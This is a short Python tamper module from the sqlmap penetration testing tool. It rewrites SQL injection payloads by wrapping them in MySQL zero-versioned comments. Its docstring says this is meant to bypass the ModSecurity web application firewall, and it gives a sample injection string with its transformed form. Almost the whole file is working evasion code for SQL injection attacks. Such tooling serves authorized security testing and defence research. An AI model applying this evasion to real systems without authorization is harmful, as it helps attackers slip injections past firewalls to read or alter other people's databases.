#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Embraces complete query with (MySQL) zero-versioned comment

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0

    Notes:
        * Useful to bypass ModSecurity WAF

    >>> tamper('1 AND 2>1--')
    '1 /*!00000AND 2>1*/--'
    """

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!00000%s*/%s" % (payload[:payload.find(' ')], payload[payload.find(' ') + 1:], postfix)

    return retVal
